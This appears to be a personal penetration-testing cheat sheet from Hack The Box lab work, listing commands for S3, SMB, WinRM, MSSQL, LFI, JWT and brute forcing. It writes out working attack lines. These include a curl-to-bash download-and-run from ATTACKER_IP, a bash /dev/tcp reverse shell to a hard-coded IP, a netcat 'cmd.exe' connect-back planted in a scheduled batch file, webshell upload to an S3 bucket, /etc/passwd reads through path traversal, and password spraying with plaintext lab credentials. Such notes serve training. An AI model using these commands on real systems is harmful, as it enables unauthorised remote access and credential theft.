```toc
```

https://www.revshells.com/

### S3
- checking s3 instances for unauthenticated access
	- `aws configure` command, then set all values to temp
	- sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).
	- We can list all of the S3 buckets hosted by the server by using the `ls` command `aws --endpoint=http://s3.thetoppers.htb s3 ls`
	- We can also use the ls command to list objects and common prefixes under the specified bucket. `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
	- copy files to s3 bucket using `cp` command `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

### netcat 
- nc reverse shell
	- create sh script
	- start netcat listener on your device with `nc -nvlp PORT`
	- host this shell script using a web server with `python3 -m http.server 8000`
	- have your compromise machine reach out to your attacking machine for the script and run it `cmd=curl%20<ATTACKER_IP>:8000/shell.sh|bash`
```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<nc_port> 0>&1
```

or run it right from prompt
```bash
bash -c "bash -i >& /dev/tcp/10.10.15.167/443 0>&1"
```

### WinRM
- port 5985
- evil-winrm
	- `evil-winrm -i 10.129.96.157 -u chase -p "Q4)sJu\Y8qz*A3?d"`
- cme to enumerate and test user/pass connection for winrm auth
	- `cme winrm 10.129.96.157 -u users.txt -p passwords.txt`



### SMB
- smbclient
	- list available shares with -L
		- `smbclient -L 10.129.220.145 -U administrator`
	- Connect to a share
		- `smbclient \\\\10.129.220.145\\ADMIN$ -U Administrator`
- impacket psexec.py
	- `python psexec.py username:password@hostIP
	- useful for if you enumerate open administrative shares or have access to these shares using creds
- impacket smbexec.py
	- `python smbexec.py Administrator@10.129.220.145
	- useful for if you enumerate open administrative shares or have access to these shares using creds
- crackmapexec
	- `cme smb 10.129.96.157 -u users.txt -p passwords.txt`
	- `cme smb 10.129.96.157 -u hazard -p stealth1agent --rid-brute` to brute force RID's and enumerate local user account names
- smbserver.py
	- host an smb server off your attacking endpoint 
		- `smbserver.py -smb2support -username guest -password guest share /root/Desktop`
		- mount this on your target (if windows) `net use x: \\10.10.14.177\share /user:guest guest`


### Impacket Psexec.py
- useful if smb is enabled and ADMIN$ is writable
- `psexec.py 'administrator:4dD!5}x/re8]FBuZ@10.129.96.157'`
- `psexec.py 'username:password@target'


### MS SQL
- impacket mssqlclient.py
	- connect to ms sql instances
	- If you have windows creds (from a service account or something), use `-windows-auth` switch
	- `python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth


### Cookies
- cookies stored under firefox > inspect > storage
- do not reload page after making changes


### Shell Python
- to enable a fully functional shell after launching a reverse webshell, use

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


### Create file and add content in one command
```bash
touch yourfile.txt && echo "Your content goes here" > yourfile.txt
```



### mkpasswd
- used to make passwords, using specific algorithms.
- Good for if you can't crack a password, but you can replace it with one that is hashed in the same way
- or even use the site https://www.mkpasswd.net/
- https://github.com/s3fxn/mkpassword

```bash
mkpasswd -m sha-512 Password1234
```


### Local File Inclusion
- potentially available if you see a url as http://10.129.95.185/?file=home.php#
- Try things like changing the file={some_file}
	- You can try and find other php files to run, like http://10.129.95.185/?file=registration.php#
	- Or you can try to load local files like /etc/passwd http://10.129.95.185/?file=/etc/passwd
- Don't forget to utilize curl if you want to work inside the cli
- if current working directory is utilized by the website, you may have to traverse the files paths to identify which is correct. ../../../etc/passwd
	-  http://10.129.95.185/?file=../../../etc/passwd
- don't forget that if you can get this working and can upload a script of your own, you can use the LFI exploit to launch the script



### Windows - check file permissions via CLI w/ icacls
```cmd
icacls job.bat
```
![[Pasted image 20231028162334.png]]
- F -> full control
- s

### Windows - easy one-liner cmd to create netcat process to connect back to a listener
```cmd
echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.241 1234 
> c:\Log-Management\job.bat
```


### Strings
- use strings on a file to return only human readable strings
- For example, used on a php file - `strings login.php.swp`
- out to a `strings login.php.swp >> file.txt`


### tac
- cat, but backwards
- reads a file in reverse, bottom up


### Check config.php for sensitive data
- `/var/www/html/login/config.php`



### Linux - check user perm
- id
- sudo -l

![[Pasted image 20231030184155.png]]


### Decrypt encrypted file with private key

`openssl rsautl -decrypt -inkey private.pub -in flag.enc -out flag.bin`

- you can also use rsactftool.py to try to crack the public key if you got it
	- `./RsaCtfTool.py --private --publickey /home/htb-jakeinthebox/key.pub --output private.pub`


### JWT Session token
- cookies can be in the form of a JWT - json web token
- they look like this `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
- Notice the leading `ey` - that is giveaway
- you can use tools like jwt.io to decrypt the jwt cookie into it's json format
- jwt_tool https://github.com/ticarpi/jwt_tool to exploit vulnerable tokens


### Examine file attributes
- use windows command "allinfo"
- works if you are connected via smb tools (like smbclient)
- `allinfo "Debug Mode Password.txt"`
```
allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Fri Aug  9 00:06:12 2019 BST
access_time:    Fri Aug  9 00:06:12 2019 BST
write_time:     Fri Aug  9 00:08:17 2019 BST
change_time:    Wed Jul 21 19:47:12 2021 BST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```

- to extract the Password data stream, you can download just the datastream from the file
	- `get "Debug Mode Password.txt:Password"`
	- `cat Debug Mode Password.txt:Password`


### Medusa
- useful tool for trying usernames and passwords against specific services
- `medusa -h 10.10.10.171 -U users.txt -P password.txt -M ssh 10.10.10.171`


### Decoding
- decode base 64 by default in linux
	- `base64 -d <file or string>`
- a weak indication that something is base64 encoded is if the encoded string is divisible by four
- special characters `< | )` etc are not base64 characters

### WFUZZ - Web



Figure out how this worked: 

python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm

This gave me a fully interactive shell